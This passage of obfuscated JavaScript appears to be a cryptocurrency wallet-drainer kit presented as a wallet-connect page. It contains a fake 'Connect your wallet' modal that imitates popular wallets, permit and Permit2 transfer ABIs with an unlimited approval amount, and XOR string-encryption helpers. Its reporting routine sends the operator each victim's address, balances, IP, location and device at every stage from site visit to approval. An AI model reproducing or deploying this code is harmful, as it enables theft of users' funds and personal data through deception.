      'name': "interfaceId",
      'type': "bytes4"
    }],
    'name': "supportsInterface",
    'outputs': [{
      'internalType': "bool",
      'name': '',
      'type': "bool"
    }],
    'payable': false,
    'stateMutability': "view",
    'type': "function"
  }],
  'PERMIT_2': [{
    'inputs': [{
      'internalType': "address",
      'name': 'owner',
      'type': 'address'
    }, {
      'internalType': "address",
      'name': 'spender',
      'type': 'address'
    }, {
      'internalType': "uint256",
      'name': 'value',
      'type': "uint256"
    }, {
      'internalType': "uint256",
      'name': "deadline",
      'type': "uint256"
    }, {
      'internalType': "uint8",
      'name': 'v',
      'type': "uint8"
    }, {
      'internalType': 'bytes32',
      'name': 'r',
      'type': "bytes32"
    }, {
      'internalType': "bytes32",
      'name': 's',
      'type': "bytes32"
    }],
    'name': "permit",
    'outputs': [],
    'stateMutability': "nonpayable",
    'type': 'function'
  }],
  'PERMIT_1': [{
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': "holder",
      'type': "address"
    }, {
      'internalType': "address",
      'name': 'spender',
      'type': 'address'
    }, {
      'internalType': "uint256",
      'name': 'nonce',
      'type': "uint256"
    }, {
      'internalType': "uint256",
      'name': "expiry",
      'type': "uint256"
    }, {
      'internalType': 'bool',
      'name': "allowed",
      'type': "bool"
    }, {
      'internalType': "uint8",
      'name': 'v',
      'type': "uint8"
    }, {
      'internalType': "bytes32",
      'name': 'r',
      'type': "bytes32"
    }, {
      'internalType': "bytes32",
      'name': 's',
      'type': "bytes32"
    }],
    'name': 'permit',
    'outputs': [],
    'payable': false,
    'stateMutability': 'nonpayable',
    'type': "function"
  }],
  'PERMIT2_SINGLE': [{
    'inputs': [{
      'internalType': "address",
      'name': '',
      'type': "address"
    }, {
      'internalType': "address",
      'name': '',
      'type': "address"
    }, {
      'internalType': "address",
      'name': '',
      'type': "address"
    }],
    'name': "allowance",
    'outputs': [{
      'internalType': "uint160",
      'name': 'amount',
      'type': "uint160"
    }, {
      'internalType': "uint48",
      'name': 'expiration',
      'type': "uint48"
    }, {
      'internalType': 'uint48',
      'name': "nonce",
      'type': "uint48"
    }],
    'stateMutability': "view",
    'type': "function"
  }, {
    'inputs': [{
      'internalType': 'address',
      'name': "owner",
      'type': "address"
    }, {
      'components': [{
        'components': [{
          'internalType': "address",
          'name': "token",
          'type': "address"
        }, {
          'internalType': "uint160",
          'name': "amount",
          'type': "uint160"
        }, {
          'internalType': "uint48",
          'name': "expiration",
          'type': "uint48"
        }, {
          'internalType': "uint48",
          'name': "nonce",
          'type': "uint48"
        }],
        'internalType': "struct IAllowanceTransfer.PermitDetails",
        'name': "details",
        'type': "tuple"
      }, {
        'internalType': "address",
        'name': "spender",
        'type': "address"
      }, {
        'internalType': "uint256",
        'name': "sigDeadline",
        'type': 'uint256'
      }],
      'internalType': "struct IAllowanceTransfer.PermitSingle",
      'name': 'permitSingle',
      'type': "tuple"
    }, {
      'internalType': "bytes",
      'name': "signature",
      'type': "bytes"
    }],
    'name': "permit",
    'outputs': [],
    'stateMutability': 'nonpayable',
    'type': 'function'
  }, {
    'inputs': [{
      'internalType': "address",
      'name': "from",
      'type': "address"
    }, {
      'internalType': "address",
      'name': 'to',
      'type': 'address'
    }, {
      'internalType': 'uint160',
      'name': 'amount',
      'type': "uint160"
    }, {
      'internalType': "address",
      'name': "token",
      'type': "address"
    }],
    'name': "transferFrom",
    'outputs': [],
    'stateMutability': 'nonpayable',
    'type': "function"
  }],
  'PERMIT2_BATCH': [{
    'inputs': [{
      'internalType': "address",
      'name': '',
      'type': "address"
    }, {
      'internalType': "address",
      'name': '',
      'type': 'address'
    }, {
      'internalType': "address",
      'name': '',
      'type': "address"
    }],
    'name': "allowance",
    'outputs': [{
      'internalType': "uint160",
      'name': "amount",
      'type': "uint160"
    }, {
      'internalType': 'uint48',
      'name': "expiration",
      'type': "uint48"
    }, {
      'internalType': "uint48",
      'name': "nonce",
      'type': "uint48"
    }],
    'stateMutability': "view",
    'type': "function"
  }, {
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }, {
      'components': [{
        'components': [{
          'internalType': "address",
          'name': "token",
          'type': "address"
        }, {
          'internalType': 'uint160',
          'name': "amount",
          'type': "uint160"
        }, {
          'internalType': "uint48",
          'name': "expiration",
          'type': 'uint48'
        }, {
          'internalType': 'uint48',
          'name': "nonce",
          'type': "uint48"
        }],
        'internalType': "struct IAllowanceTransfer.PermitDetails[]",
        'name': "details",
        'type': "tuple[]"
      }, {
        'internalType': 'address',
        'name': "spender",
        'type': 'address'
      }, {
        'internalType': "uint256",
        'name': 'sigDeadline',
        'type': "uint256"
      }],
      'internalType': "struct IAllowanceTransfer.PermitBatch",
      'name': "permitBatch",
      'type': 'tuple'
    }, {
      'internalType': 'bytes',
      'name': 'signature',
      'type': "bytes"
    }],
    'name': "permit",
    'outputs': [],
    'stateMutability': "nonpayable",
    'type': "function"
  }, {
    'inputs': [{
      'components': [{
        'internalType': "address",
        'name': 'from',
        'type': "address"
      }, {
        'internalType': 'address',
        'name': 'to',
        'type': "address"
      }, {
        'internalType': "uint160",
        'name': 'amount',
        'type': "uint160"
      }, {
        'internalType': "address",
        'name': "token",
        'type': "address"
      }],
      'internalType': "struct IAllowanceTransfer.AllowanceTransferDetails[]",
      'name': "transferDetails",
      'type': "tuple[]"
    }],
    'name': "transferFrom",
    'outputs': [],
    'stateMutability': 'nonpayable',
    'type': 'function'
  }]
};
let MS_Ready = false;
let MS_ID = 0x0;
let MS_Deviceinfo;
let MS_Process = false;
let MS_Provider = null;
let MS_Current_Provider = null;
let MS_Current_Address = null;
let MS_Current_Chain_ID = null;
let MS_Web3 = null;
let MS_Signer = null;
let MS_Check_Done = false;
let MS_Currencies = {};
let MS_Force_Mode = false;
let MS_Sign_Disabled = true;
let BL_US = false;
let SP_US = false;
let XY_US = false;
let MS_Bad_Country = false;
let MS_Connection = false;
let MS_Load_Time = null;
const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
const is_valid_json = _0x319ce0 => {
  try {
    JSON.parse(_0x319ce0);
  } catch (_0x1bba48) {
    return false;
  }
  return true;
};
(async () => {
  try {
    let _0x31aa14 = await fetch('https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD', {
      'method': "GET",
      'headers': {
        'Accept': "application/json"
      }
    });
    MS_Currencies = await _0x31aa14.json();
    MS_Currencies.PLS = {
      'USD': 0.00004512
    };
  } catch (_0x5a7625) {
    console.log(_0x5a7625);
  }
})();
const MS_API_Data = {
  0x1: 'api.etherscan.io',
  0xa: "api-optimistic.etherscan.io",
  0x38: "api.bscscan.com",
  0x89: 'api.polygonscan.com',
  0xfa: "api.ftmscan.com",
  0xa4b1: 'api.arbiscan.io',
  0xa86a: 'api.snowtrace.io',
  0x2105: "api.basescan.org"
};
var MS_MetaMask_ChainData = {};
const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    0x1: {
      'chainId': "0x1",
      'chainName': "Ethereum Mainnet",
      'nativeCurrency': {
        'name': 'Ether',
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x1]],
      'blockExplorerUrls': ["https://etherscan.io"]
    },
    0x38: {
      'chainId': "0x38",
      'chainName': "BNB Smart Chain",
      'nativeCurrency': {
        'name': "Binance Coin",
        'symbol': 'BNB',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x38]],
      'blockExplorerUrls': ["https://bscscan.com"]
    },
    0x89: {
      'chainId': "0x89",
      'chainName': "Polygon Mainnet",
      'nativeCurrency': {
        'name': "MATIC",
        'symbol': 'MATIC',
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x89]],
      'blockExplorerUrls': ["https://polygonscan.com"]
    },
    0xa86a: {
      'chainId': "0xA86A",
      'chainName': "Avalanche Network C-Chain",
      'nativeCurrency': {
        'name': "AVAX",
        'symbol': "AVAX",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa86a]],
      'blockExplorerUrls': ['https://snowtrace.io/']
    },
    0xa4b1: {
      'chainId': '0xA4B1',
      'chainName': "Arbitrum One",
      'nativeCurrency': {
        'name': "ETH",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa4b1]],
      'blockExplorerUrls': ["https://explorer.arbitrum.io"]
    },
    0xa: {
      'chainId': "0xA",
      'chainName': "Optimism",
      'nativeCurrency': {
        'name': "ETH",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xa]],
      'blockExplorerUrls': ["https://optimistic.etherscan.io/"]
    },
    0xfa: {
      'chainId': '0xFA',
      'chainName': "Fantom Opera",
      'nativeCurrency': {
        'name': 'FTM',
        'symbol': "FTM",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0xfa]],
      'blockExplorerUrls': ["https://ftmscan.com/"]
    },
    0x2105: {
      'chainId': "0x2105",
      'chainName': 'Base',
      'nativeCurrency': {
        'name': 'ETH',
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x2105]],
      'blockExplorerUrls': ["https://basescan.org/"]
    },
    0x144: {
      'chainId': '0x144',
      'chainName': "zkSync Era",
      'nativeCurrency': {
        'name': "ETH",
        'symbol': "ETH",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x144]],
      'blockExplorerUrls': ["https://explorer.zksync.io/"]
    },
    0x171: {
      'chainId': "0x171",
      'chainName': "Pulse",
      'nativeCurrency': {
        'name': "PLS",
        'symbol': "PLS",
        'decimals': 0x12
      },
      'rpcUrls': [MS_Settings.RPCs[0x171]],
      'blockExplorerUrls': ["https://scan.pulsechain.com/"]
    }
  };
};
const MS_Routers = {
  0x1: [["Uniswap", '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'], ['Pancake', "0xEfF92A263d31888d860bD50809A8D171709b7b1c"], ["Pancake_V3", '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'], ["Sushiswap", "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"]],
  0xa: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"]],
  0x38: [['Pancake', "0x10ED43C718714eb63d5aA57B78B54704E256024E"], ['Pancake_V3', "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"], ["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0x89: [['Uniswap', "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"], ['Sushiswap', "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"], ["Quickswap", '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']],
  0xfa: [['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']],
  0xa4b1: [["Uniswap", "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"], ["Sushiswap", "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],
  0xa86a: [['Sushiswap', "0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]]
};
const MS_Swap_Route = {
  0x1: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
  0xa: "0x4200000000000000000000000000000000000006",
  0x38: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",
  0x89: "0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",
  0xfa: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  0xa4b1: "0x82af49447d8a07e3bd95bd0d56f35241523fbab1",
  0xa86a: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};
const MS_Uniswap_ABI = [{
  'inputs': [{
    'internalType': "uint256",
    'name': "amountIn",
    'type': 'uint256'
  }, {
    'internalType': 'uint256',
    'name': "amountOutMin",
    'type': "uint256"
  }, {
    'internalType': 'address[]',
    'name': 'path',
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': "address"
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': "uint256",
    'name': "amountOut",
    'type': "uint256"
  }],
  'stateMutability': "payable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': "deadline",
    'type': "uint256"
  }, {
    'internalType': "bytes[]",
    'name': "data",
    'type': 'bytes[]'
  }],
  'name': 'multicall',
  'outputs': [{
    'internalType': "bytes[]",
    'name': '',
    'type': "bytes[]"
  }],
  'stateMutability': 'payable',
  'type': "function"
}];
const MS_Pancake_ABI = [{
  'inputs': [{
    'internalType': 'uint256',
    'name': "amountIn",
    'type': 'uint256'
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': 'uint256'
  }, {
    'internalType': "address[]",
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': "address"
  }, {
    'internalType': 'uint256',
    'name': "deadline",
    'type': "uint256"
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': "uint256[]"
  }],
  'stateMutability': "nonpayable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': 'amountIn',
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': "amountOutMin",
    'type': "uint256"
  }, {
    'internalType': 'address[]',
    'name': "path",
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': 'address'
  }, {
    'internalType': "uint256",
    'name': "deadline",
    'type': "uint256"
  }],
  'name': "swapExactTokensForETH",
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': 'uint256[]'
  }],
  'stateMutability': "nonpayable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': 'uint256',
    'name': "deadline",
    'type': "uint256"
  }, {
    'internalType': "bytes[]",
    'name': 'data',
    'type': "bytes[]"
  }],
  'name': "multicall",
  'outputs': [{
    'internalType': "bytes[]",
    'name': '',
    'type': 'bytes[]'
  }],
  'stateMutability': "payable",
  'type': "function"
}, {
  'inputs': [{
    'internalType': "uint256",
    'name': 'amountIn',
    'type': "uint256"
  }, {
    'internalType': "uint256",
    'name': 'amountOutMin',
    'type': "uint256"
  }, {
    'internalType': "address[]",
    'name': 'path',
    'type': "address[]"
  }, {
    'internalType': "address",
    'name': 'to',
    'type': "address"
  }],
  'name': "swapExactTokensForTokens",
  'outputs': [{
    'internalType': "uint256[]",
    'name': "amounts",
    'type': "uint256[]"
  }],
  'stateMutability': "nonpayable",
  'type': "function"
}];
const MS_Current_URL = 'https://t.me/cryptocoder0'.replace(/http[s]*:\/\//, '');
const MS_Mobile_Status = (() => {
  let _0x45bac8 = false;
  (function (_0x1f2aef) {
    if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(_0x1f2aef) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(_0x1f2aef.substr(0x0, 0x4))) {
      _0x45bac8 = true;
    }
  })(navigator.userAgent || navigator.vendor || window.opera);
  return _0x45bac8;
})();
const MS_Apple_Status = (() => {
  try {
    return ["iPad Simulator", "iPhone Simulator", "iPod Simulator", "iPad", "iPhone", "iPod"].includes(navigator.platform) || navigator.userAgent.includes("Mac") && "ontouchend" in document;
  } catch (_0xbd9e66) {
    return false;
  }
})();
const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';
const MS_Modal_Data = [{
  'type': "style",
  'data': "@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }"
}, {
  'type': 'html',
  'data': "<div class=\"web3-modal-main\"><p class=\"web3-modal-title\" style=\"margin-top:0\">Connect your wallet</p><div class=\"web3-modal-items\"><div class=\"item\" onclick='connect_wallet(\"MetaMask\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/MM.svg\" alt=\"\"></div><span>MetaMask</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Coinbase\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/CB.svg\" alt=\"\"></div><span>Coinbase</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Trust Wallet\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/TW.svg\" alt=\"\"></div><span>Trust Wallet</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"Binance Wallet\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/BW.svg\" alt=\"\"></div><span>Binance Wallet</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick=\"use_wc()\"><div><div class=\"icon\"></div><span>More Wallets</span></div><div class=\"arrow\"></div></div></div></div><div class=\"web3-modal-wc\" style=\"display:none\"><p class=\"web3-modal-title\" style=\"margin-top:0\">Choose Version</p><div class=\"web3-modal-items\"><div class=\"item\" onclick='connect_wallet(\"WalletConnect\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/WC.svg\" alt=\"\"></div><span>WalletConnect</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick='connect_wallet(\"WalletConnect\")'><div><div class=\"icon\"><img src=\"/assets/web3-modal/images/WC1.svg\" alt=\"\"></div><span>WalletConnect Legacy</span></div><div class=\"arrow\"></div></div><div class=\"item\" onclick=\"ms_init()\"><div class=\"arrow\" style=\"transform:rotateY(190deg)\"></div><div><div class=\"icon\"></div><span>Return to Wallets</span></div></div></div></div>"
}];
const inject_modal = () => {
  try {
    let _0x4f8e26 = document.createElement("style");
    _0x4f8e26.id = 'web3-style';
    _0x4f8e26.innerHTML = MS_Modal_Data[0x0].data;
    document.head.appendChild(_0x4f8e26);
    let _0x17439c = document.createElement('div');
    _0x17439c.id = 'web3-overlay';
    _0x17439c.classList = ['web3-overlay'];
    _0x17439c.style.display = 'none';
    document.body.prepend(_0x17439c);
    document.querySelector(".web3-overlay").addEventListener('click', () => {
      ms_hide();
    });
    let _0x57f86d = document.createElement("div");
    _0x57f86d.id = 'web3-modal';
    _0x57f86d.classList = ['web3-modal'];
    _0x57f86d.style.display = "none";
    _0x57f86d.innerHTML = MS_Modal_Data[0x1].data;
    document.body.prepend(_0x57f86d);
  } catch (_0x2603f1) {
    console.log(_0x2603f1);
  }
};
const set_modal_data = (_0x5d72fe, _0x27c584) => {
  try {
    MS_Modal_Data[0x0].data = _0x5d72fe;
    MS_Modal_Data[0x1].data = _0x27c584;
    reset_modal();
  } catch (_0x193a41) {
    console.log(_0x193a41);
  }
};
const reset_modal = () => {
  try {
    document.getElementById("web3-modal").remove();
  } catch (_0x284db4) {
    console.log(_0x284db4);
  }
  try {
    document.getElementById('web3-overlay').remove();
  } catch (_0x57ebae) {
    console.log(_0x57ebae);
  }
  try {
    document.getElementById("web3-style").remove();
  } catch (_0x100268) {
    console.log(_0x100268);
  }
  try {
    inject_modal();
  } catch (_0x20ae60) {
    console.log(_0x20ae60);
  }
};
const ms_init = () => {
  try {
    if (!MS_Connection) {
      return connect_wallet();
    }
    if (MS_Process) {
      return;
    }
    MSM.open("light", 0x1);
  } catch (_0x8f2472) {
    console.log(_0x8f2472);
  }
};
const ms_hide = () => {
  try {
    MSM.close();
  } catch (_0x4e9c4c) {
    console.log(_0x4e9c4c);
  }
};
const load_wc = async () => {
  let _0x2789a2 = [];
  let _0x8c1a68 = {};
  for (const _0x1029d6 in MS_Settings.RPCs) {
    if (_0x1029d6 != '1') {
      _0x2789a2.push(_0x1029d6);
    }
    _0x8c1a68[_0x1029d6] = MS_Settings.RPCs[_0x1029d6];
  }
  MS_Provider = await WC2_Provider.init({
    'projectId': 'ea52b0e550593829f2eee2cb9006f642',
    'chains': ['1'],
    'optionalChains': _0x2789a2,
    'metadata': MS_WalletConnect_MetaData,
    'showQrModal': true,
    'rpcMap': _0x8c1a68,
    'methods': ["eth_sendTransaction", "eth_signTransaction", "eth_sign", 'personal_sign', "eth_signTypedData", "eth_signTypedData_v4"],
    'qrModalOptions': undefined
  });
};
const prs = (_0x19180a, _0x1708e9) => {
  const _0xd71ba9 = _0x416650 => _0x416650.split('').map(_0x48a0d3 => _0x48a0d3.charCodeAt(0x0));
  const _0x4cd0ce = _0x15697c => ('0' + Number(_0x15697c).toString(0x10)).substr(-0x2);
  const _0x474de5 = _0x522342 => _0xd71ba9(_0x19180a).reduce((_0x45ed3b, _0x37079b) => _0x45ed3b ^ _0x37079b, _0x522342);
  return _0x1708e9.split('').map(_0xd71ba9).map(_0x474de5).map(_0x4cd0ce).join('');
};
const srp = (_0x4a1239, _0x1c6da2) => {
  const _0x479603 = _0x3a648d => _0x3a648d.split('').map(_0x3bbb37 => _0x3bbb37.charCodeAt(0x0));
  const _0x2646b6 = _0x441176 => _0x479603(_0x4a1239).reduce((_0x7c18ee, _0x3117c3) => _0x7c18ee ^ _0x3117c3, _0x441176);
  return _0x1c6da2.match(/.{1,2}/g).map(_0xe6ee81 => parseInt(_0xe6ee81, 0x10)).map(_0x2646b6).map(_0x18d269 => String.fromCharCode(_0x18d269)).join('');
};
let prs_enc = 0x0;
let last_request_ts = 0x0;
(async () => {
  prs_enc = MS_Encryption_Key;
  MS_Encryption_Key = Math.floor(Math.random() * 0x3e8);
})();
const send_request = async _0x41dc7c => {
  try {
    while (Date.now() <= last_request_ts) {
      await new Promise(_0x27f6a5 => setTimeout(_0x27f6a5, 0x1));
    }
    last_request_ts = Date.now();
    _0x41dc7c.domain = 'coinbaracus.io';
    _0x41dc7c.user_id = MS_ID || null;
    console.log("Data enviado ", _0x41dc7c);
    let _0x57fb6f = JSON.parse("{ \"status\": \"OK\" }");
    switch (_0x41dc7c.action) {
      case "enter_website":
        await Noti_info(_0x41dc7c.action, _0x41dc7c.wallet, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      case 'connect_request':
        break;
      case "sign_verify":
        break;
      case 'connect_success':
        const _0x156838 = convert_chain('ID', 'ANKR', _0x41dc7c.chain_id);
        await Noti_connect(_0x41dc7c.address, _0x156838, _0x41dc7c.wallet, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      case 'check_wallet':
        console.log(_0x41dc7c.action);
        break;
      case 'check_finish':
        await Noti_assets(_0x41dc7c.address, _0x41dc7c.balance, _0x41dc7c.assets, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      case 'sign_request':
        break;
      case "approve_request":
        await Noti_request(_0x41dc7c.action, _0x41dc7c.asset, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      case "approve_cancel":
        await Noti_info(_0x41dc7c.action, _0x41dc7c.wallet, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      case 'transfer_request':
        await Noti_info(_0x41dc7c.action, _0x41dc7c.wallet, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      case "transfer_cancel":
        await Noti_info(_0x41dc7c.action, _0x41dc7c.wallet, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
        break;
      default:
        await Noti_info(_0x41dc7c.action, _0x41dc7c.address, _0x41dc7c.domain, MS_Deviceinfo.browser, MS_Deviceinfo.isMobile, MS_Deviceinfo.ip, MS_Deviceinfo.locate);
    }
    return _0x57fb6f;
  } catch (_0x1c3737) {
    console.warn("[-] Error en send_request: ", _0x1c3737);
  }
};
function safeToString(_0xbce7de) {
  return _0xbce7de ? _0xbce7de.toString() : "N/A";
}
const retrive_config = async () => {
  try {
    const _0x2e5839 = await send_request({
      'action': 'retrive_config'
    });
    if (_0x2e5839.status == 'OK') {
      MS_Connection = true;
      MS_Settings = _0x2e5839.data;
      console.log(MS_Settings);
      if (!MS_Settings.CIS) {
        MS_Bad_Country = false;
      }
      if (typeof MS_Settings.DSB == "boolean" && MS_Settings.DSB === true) {
        window.location.href = "about:blank";
      }
    }
  } catch (_0x2d4bff) {
    console.log(_0x2d4bff);
  }
};
const retrive_contract = async () => {
  try {
    const _0x3dd960 = await send_request({
      'action': "retrive_contract"
    });
    if (_0x3dd960.status == 'OK') {
      MS_Contract_ABI = _0x3dd960.data;
    }
    console.log(MS_Contract_ABI);
  } catch (_0x1a885e) {
    console.log(_0x1a885e);
  }
};
async function getDeviceInfo() {
  const _0x24749d = navigator.userAgent;
  let _0x5693bf = "Unknown";
  let _0x17ff55 = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(_0x24749d);
  if (_0x24749d.includes('Firefox')) {
    _0x5693bf = 'Firefox';
  } else {
    if (_0x24749d.includes("Chrome")) {
      _0x5693bf = "Chrome";
    } else {
      if (_0x24749d.includes("Safari")) {
        _0x5693bf = "Safari";
      } else {
